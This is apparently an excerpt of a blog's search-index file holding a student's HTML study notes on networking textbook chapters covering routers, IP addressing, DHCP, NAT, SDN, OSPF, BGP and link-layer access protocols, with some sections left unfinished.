+<h4 id="Chapter-4-Network-Layer-Data-Plane"><a href="#Chapter-4-Network-Layer-Data-Plane" class="headerlink" title="Chapter 4 Network Layer: Data Plane"></a>Chapter 4 Network Layer: Data Plane</h4><blockquote>
+<p>Internet edge ends, Internet Edge begins.</p>
+<p><strong>Data plane:</strong> local router actions moving a datagram from an input link to an output link at a router. <strong>Control plane:</strong> the network wide view of getting packets from one edge of network to another edge of network.The coordination and the management of all devices in the Internet.</p>
+</blockquote>
+<ul>
+<li><p>network-layer functions</p>
+<ul>
+<li>forwarding: local, move packets from a router’s input link to appropriate router output link.Nanosecond time scale and implemented in hardware.</li>
+<li>routing: network-wide, determine route taken by packets from source to destination.Second time scale and implemented in software.</li>
+</ul>
+</li>
+<li><p>router</p>
+<ul>
+<li><p>architecture</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\routerArchi.png" alt="routerArchi" style="zoom: 80%;" />
+
+<ol>
+<li>Input Port</li>
+</ol>
+<img src="D:\blog\coriiiander\source\_posts\pictures\inputPort.png" alt="inputPort" style="zoom:80%;" />
+
+<ul>
+<li><p>line termination: physical layer, bit-level reception.</p>
+</li>
+<li><p>link layer protocol: bits are assembled into link layer frames, like the Ethernet frames.</p>
+</li>
+<li><p>decentralized switching: network layer functions, match plus action.</p>
+<ul>
+<li><p>forwarding</p>
+<p>① destination-based forwarding: forward based only on destination IP address (traditional).</p>
+<p>② generalized forwarding: forward based on any set of header field values.</p>
+<blockquote>
+<p>Longest prefix match: using ternary content addressable memories (TCAMs). Present address to TCAM, retrieve address in one clock cycle, regardless of table size.</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<ol start="2">
+<li><p>Switching Fabrics</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\swichingFabrics.png" alt="swichingFabrics" style="zoom: 80%;" /></li>
+</ol>
+<blockquote>
+<p>NR &gt; R: non-blocking machine.</p>
+</blockquote>
+<ul>
+<li><p>three major types of switching fabrics:</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\3types.png" alt="3types" style="zoom:80%;" />
+
+<p>① Switching via memory: pkt signal the CPU via an interrupt, pkt copied to system’s memory.</p>
+<p>② Bus: switching speed limited by bus bandwidth.</p>
+<p>③ interconnection network.</p>
+</li>
+</ul>
+</li>
+<li><p>queuing</p>
+<ul>
+<li><p>Input port queuing</p>
+<ul>
+<li>Head-of-the-Line (HOL) blocking: green pkt will experiences HOL blocking one packet time later.</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\HOL.png" alt="HOL" style="zoom:80%;" /></li>
+<li><p>Output port queuing</p>
+<ul>
+<li><p>How much buffering?</p>
+<p>① RFC 3439: RTT times(*) link capacity C.</p>
+<p>② recent: with N flows, RTT*C/√N</p>
+</li>
+<li><p>Buffer Management</p>
+<ul>
+<li><p>drop: tail drop/priority.</p>
+</li>
+<li><p>marking: (ECN, RED)</p>
+<blockquote>
+<p>ECN: Explicit Congestion Notification</p>
+</blockquote>
+</li>
+<li><p>Packet Scheduling: FCFS, priority, round robin, weighted fair queueing(gets weighted amount of service in each cycle)</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Network Neutrality</p>
+</li>
+<li><p>IP</p>
+<ul>
+<li><p>IPv4</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\ipv4.png" alt="ipv4" style="zoom:67%;" />
+
+<ul>
+<li>dotted-decimal IP address notation: 223.1.1.1 = 11011111 00000001 00000001 00000001</li>
+<li>subnet mask: 223.1.1.0/24 中 /24 指示32比特中最左侧24比特定义了子网地址。</li>
+</ul>
+</li>
+<li><p>IP addressing(allocation strategy): CIDR(Classless InterDomain Routing)</p>
+</li>
+<li><p>DHCP: Dynamic Host Configuration Protocol</p>
+<blockquote>
+<p>How does <strong>host</strong> get IP address? hard-coded by sysadmin in config file or DHCP(plug-and-play)</p>
+<p>Network get subnet part of IP address from its ISP’s address space.</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\ispip.png" alt="ispip" style="zoom:80%;" />
+</blockquote>
+<ul>
+<li>DHCP server will be co-located in router, serving all subnets to which router is attached.</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\DHCP.png" alt="DHCP" style="zoom:80%;" />
+
+<ul>
+<li> <strong>src</strong>: 0.0.0.0 no IP yet; <strong>dest</strong>: 255.255.255.255 broadcast to all interfaces on the subnet; <strong>transaction ID</strong>: reply num.</li>
+</ul>
+<blockquote>
+<p>DHCP can return more than just allocated IP address on subnet.</p>
+</blockquote>
+</li>
+<li><p>address aggregation (route aggregation/route summarization):  使用单个网络前缀通告多个网络。</p>
+</li>
+<li><p>NAT(network address translation)</p>
+<blockquote>
+<p>Since hundreds of thousands of networks are using same block of addresses which only have meaning within the given network, we can’t use them as source or a destination addresses.</p>
+</blockquote>
+<img src="D:\blog\coriiiander\source\_posts\pictures\NAT.png" alt="NAT" style="zoom:67%;" />
+
+<ul>
+<li>use a NAT translation table at NAT router(include port numbers &amp; IP addresses) to know which internal host it is.</li>
+</ul>
+<blockquote>
+<p>controversy: port nums should be used for addressing processes, not for addressing hosts. </p>
+</blockquote>
+</li>
+<li><p>IPv6</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\IPv6.png" alt="IPv6" style="zoom: 67%;" />
+
+<ul>
+<li>tunneling: IPv6 datagram carried as payload in IPv4 datagram among IPv4 routers.</li>
+</ul>
+</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\ipv46.png" alt="ipv46" style="zoom:67%;" /></li>
+<li><p>Generalized Forwarding and SDN</p>
+<ul>
+<li><p>OpenFlow: a standard that pioneered the notion of the match-plus-action, as well as the SDN revolution more generally.</p>
+</li>
+<li><p>match: OpenFlow flow table</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\openflow.png" alt="openflow" style="zoom:67%;" /></li>
+<li><p>action: forwarding, dropping, modify-field.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Chapter-5-Network-Layer-Control-Plane"><a href="#Chapter-5-Network-Layer-Control-Plane" class="headerlink" title="Chapter 5 Network Layer: Control Plane"></a>Chapter 5 Network Layer: Control Plane</h4><ul>
+<li><p>two control-plane approaches: </p>
+<ul>
+<li><p>traditional per-router control: implemented in routers; forwarding table ↓</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\traditional.png" alt="traditional" style="zoom:67%;" />
+
+<blockquote>
+<p>a routing algorithm runs in each and every router and the routing component in the router communicates with the routing components in other routers.</p>
+</blockquote>
+</li>
+<li><p>software-defined networking (SDN): implemented in (remote) servers. flow table ↓</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\sdn.png" alt="sdn" style="zoom:67%;" />
+
+<ul>
+<li>control agent (CA) has minimum functionality.It’s job is to communicate with the controller, and to do as the controller commands.(key distinction between two approaches)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>Routing Algorithms</p>
+<blockquote>
+<p>traditional routing algorithms is the basis for OSPF  &amp; BGP.</p>
+</blockquote>
+<ul>
+<li>The Link-State (LS) Routing Algorithm</li>
+<li>The Distance-Vector (DV) Routing Algorithm</li>
+</ul>
+<p>【算法的坑以后再来补】</p>
+</li>
+<li><p>Intra-AS Routing in the Internet: OSPF - Open Shortest Path First</p>
+<ul>
+<li>autonomous systems (ASs): consisting of a group of routers that are under the same administrative control. Identified by autonomous system number (ASN).</li>
+</ul>
+<blockquote>
+<p>The routing algorithm running within an AS is called an intra-autonomous system routing protocol.</p>
+<p>OSPF: a publicly available(open) link-state protocol.</p>
+</blockquote>
+<ul>
+<li>router broadcasts routing information to all other routers in the AS.</li>
+</ul>
+</li>
+<li><p>Routing Among the ISPs: BGP - Border Gateway Protocol</p>
+<blockquote>
+<p>BGP let each subnet know each other’s existence and determine the best routes to the prefixes.</p>
+</blockquote>
+<ul>
+<li><p>gateway router &amp; internal router, external BGP (eBGP) &amp; internal BGP (iBGP)</p>
+</li>
+<li><p>BGP attributes: AS-PATH &amp; NEXT-HOP</p>
+<blockquote>
+<p>a prefix along with its attributes is called a route.</p>
+</blockquote>
+<ul>
+<li>AS-PATH contains the list of ASs through which the advertisement has passed. (AS2 AS3, AS3)</li>
+<li>NEXT-HOP is the IP address of the router interface that begins the AS-PATH. (2a, 3d)</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\distribute.png" alt="distribute" style="zoom:50%;" /></li>
+<li><p>Hot Potato Routing</p>
+<ul>
+<li>a router (eg. 1b) choose route with the least cost to the NEXT-HOP router.It tries to reduce the cost in its own AS while ignoring the outside. </li>
+</ul>
+</li>
+<li><p>Route-Selection Algorithm</p>
+<blockquote>
+<p>If there are two or more routes to the same prefix…</p>
+</blockquote>
+<ul>
+<li>local preference value attributes</li>
+<li>the shortest AS-PATH(same above goes below…)</li>
+<li>closest NEXT-HOP router(hot potato routing)</li>
+<li>BGP identifiers</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>The SDN Control Plane</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\componentsOfSDN.png" alt="componentsOfSDN" style="zoom:67%;" />
+
+<ul>
+<li><p>SDN controller </p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\componentOfcontroller.png" alt="componentOfcontroller" style="zoom: 80%;" />
+
+<ul>
+<li>a communication layer: communicating between the SDN controller and controlled network devices.</li>
+<li>a network-wide state-management layer. </li>
+<li>the interface to the network-control application layer: the northbound API allows network-control applications to read/write network state and flow tables within the state management layer. </li>
+</ul>
+<blockquote>
+<p>controller: logically centralized but physically distributed.</p>
+</blockquote>
+</li>
+<li><p>OpenFlow Protocol</p>
+<ul>
+<li>The OpenFlow protocol operates over TCP, with a default port number of 6653.</li>
+<li>messages flowing from the controller to the controlled switch: <ol>
+<li>configuration: set a switch’s configuration parameters.</li>
+<li>modify-State: modify entries in the switch’s flow table and ports.</li>
+<li>read-State: collect statistics and counter values from the switch’s flow table and ports.</li>
+<li>send-Packet: send msg contains the packet to be sent in its payload.</li>
+</ol>
+</li>
+<li>messages flowing from the SDN-controlled switch to the controller:<ol>
+<li>flow-removed: informs that a flow table entry has been removed.</li>
+<li>port-status: inform changes in port status.</li>
+<li>packet-in.</li>
+</ol>
+</li>
+<li></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>ICMP - The Internet Control Message Protocol</p>
+</li>
+</ul>
+<ul>
+<li><p>Network Management and SNMP</p>
+<ul>
+<li><p>network management framework </p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\componentOfnetwork.png" alt="componentOfnetwork" style="zoom:60%;" /></li>
+<li><p>SNMP - Simple Network Management Protocol </p>
+<ul>
+<li>an application-layer protocol used to convey network-management control and information messages between a managing server and an agent executing on behalf of that managing server.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Chapter-6-The-Link-Layer-and-LANs"><a href="#Chapter-6-The-Link-Layer-and-LANs" class="headerlink" title="Chapter 6 The Link Layer and LANs"></a>Chapter 6 The Link Layer and LANs</h4><blockquote>
+<p>Refer to any device that runs a link-layer protocol as a <strong>node</strong>, communication channels that connect adjacent nodes along the communication path as <strong>links</strong>.</p>
+</blockquote>
+<ul>
+<li><p>Where the link layer is implemented ?</p>
+<ul>
+<li>Link layer is implemented in a <strong>network adapter</strong> (aka a <strong>network interface card (NIC)</strong>).</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\networkAdapter.png" alt="networkAdapter" style="zoom:50%;" /></li>
+<li><p>Error-Detection and -Correction</p>
+</li>
+</ul>
+<p>【待补】</p>
+<ul>
+<li><p>Multiple Access Links and Protocols</p>
+<ul>
+<li><p>two types of network links:</p>
+<ul>
+<li><p>point-to-point links</p>
+<ul>
+<li>single sender and receiver at end of the link.</li>
+<li>protocols: point-to-point protocol (PPP) and high-level data link control (HDLC).</li>
+</ul>
+</li>
+<li><p> broadcast links</p>
+</li>
+<li><p>multiple sending and receiving nodes connected to the same, single, shared broadcast channel. </p>
+</li>
+<li><p>example technologies: Ethernet and wireless LANs.</p>
+</li>
+<li><p>protocol: multiple access protocols.</p>
+<ol>
+<li><p>channel partitioning protocols</p>
+</li>
+<li><p>random access protocols</p>
+</li>
+<li><p>taking-turns protocols</p>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+<li><p>Channel Partitioning Protocols</p>
+<ul>
+<li>TDM/FDM: each node gets a dedicated transmission rate of <em>R</em>/<em>N</em> bps during each frame time. </li>
+<li>CDMA (code division multiple access): assigns a different <em>code</em> to each node so that different nodes can transmit simultaneously and received correctly(anti-jamming).</li>
+</ul>
+</li>
+<li><p>Random Access Protocols</p>
+<blockquote>
+<p>nodes transmit at full rate, repeatedly retransmits when collision happens.It doesn’t retransmit right away. Instead waiting a random delay. </p>
+</blockquote>
+<ul>
+<li><p>ALOHA protocols: </p>
+<ol>
+<li>Slotted ALOHA</li>
+<li>ALOHA</li>
+</ol>
+</li>
+<li><p>carrier sense multiple access (CSMA) protocols:</p>
+<p>Carrier Sense Multiple Access with Collision Dection (CSMA/CD)</p>
+<blockquote>
+<p>Ethernet is a popular and widely deployed CSMA protocol.</p>
+</blockquote>
+</li>
+<li></li>
+</ul>
+</li>
+<li><p>Taking-Turns Protocols</p>
+<ul>
+<li>polling protocol: round-robin. Eliminates collisions and empty slots</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Switched Local Area Networks</p>
+</li>
+</ul>
 ]]></content>
   </entry>
 </search>
